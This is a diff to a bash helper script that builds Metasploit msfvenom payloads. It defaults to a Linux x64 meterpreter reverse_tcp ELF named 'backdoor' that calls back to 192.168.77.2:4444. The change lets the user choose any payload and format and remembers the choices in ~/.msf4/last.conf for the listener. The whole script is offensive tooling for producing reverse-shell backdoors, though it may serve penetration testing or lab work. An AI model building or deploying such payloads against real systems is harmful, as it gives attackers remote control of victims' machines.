@@ -1,22 +1,26 @@
 #!/usr/bin/env bash
-# Linux meterpreter ELF, remembers  last LHOST/LPORT used.
-# Writes those values to a shared file so the handler picks up the same ones.
+# Build any msfvenom payload remembering what you used last time.
+# Writes the choices to a shared file so the handler can match them.
 
 state="$HOME/.msf4/last.conf"
 
-# Start with defaults and overwrite with whatever was saved last time.
+# Defaults, overwritten by whatever was saved last run.
+payload="linux/x64/meterpreter/reverse_tcp"
 lhost="192.168.77.2"
 lport="4444"
+format="elf"
 [ -f "$state" ] && . "$state"
 
-# Keep value in brackets unless replaced.
+# Enter keeps the bracketed value; type to change it.
+read -rp "Payload [$payload]: " in; payload=${in:-$payload}
 read -rp "LHOST [$lhost]: " in; lhost=${in:-$lhost}
 read -rp "LPORT [$lport]: " in; lport=${in:-$lport}
+read -rp "Format [$format]: " in; format=${in:-$format}
 read -rp "Output file [backdoor]: " in; out=${in:-backdoor}
 
-# Save and write so handler can read.
+# Save for next time and for the handler to read.
 mkdir -p "$(dirname "$state")"
-printf 'lhost=%s\nlport=%s\n' "$lhost" "$lport" > "$state"
+printf 'payload=%s\nlhost=%s\nlport=%s\nformat=%s\n' "$payload" "$lhost" "$lport" "$format" > "$state"
 
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$out"
-echo "Built $out -> $lhost:$lport"
+msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$out"
+echo "Built $out -> $payload $lhost:$lport"
